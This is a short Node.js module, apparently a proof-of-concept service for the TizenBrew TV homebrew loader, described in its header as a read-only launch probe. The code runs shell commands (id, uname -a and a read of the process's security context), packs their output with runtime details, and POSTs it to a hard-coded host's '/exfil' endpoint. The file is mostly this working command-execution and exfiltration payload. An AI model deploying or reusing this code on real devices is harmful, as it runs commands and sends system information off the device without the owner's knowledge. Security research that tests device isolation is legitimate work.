/* Read-only proof that TizenBrew launched this service module. */
'use strict';

var http = require('http');
var childProcess = require('child_process');

childProcess.exec('id; uname -a; cat /proc/self/attr/current 2>/dev/null', {
  timeout: 10000,
  maxBuffer: 256 * 1024
}, function (error, stdout, stderr) {
  var body = JSON.stringify({
    id: 'service-probe-' + process.pid,
    marker: 'tizenbrew-isolated-service-probe-v1',
    error: error ? error.message : null,
    stdout: String(stdout || ''),
    stderr: String(stderr || ''),
    node: process.version,
    arch: process.arch
  });
  var req = http.request({
    hostname: '192.168.0.73',
    port: 8009,
    path: '/exfil',
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Content-Length': Buffer.byteLength(body),
      'Connection': 'close'
    }
  });
  req.on('error', function (requestError) {
    console.error('Service probe callback failed: ' + requestError.message);
  });
  req.end(body);
});
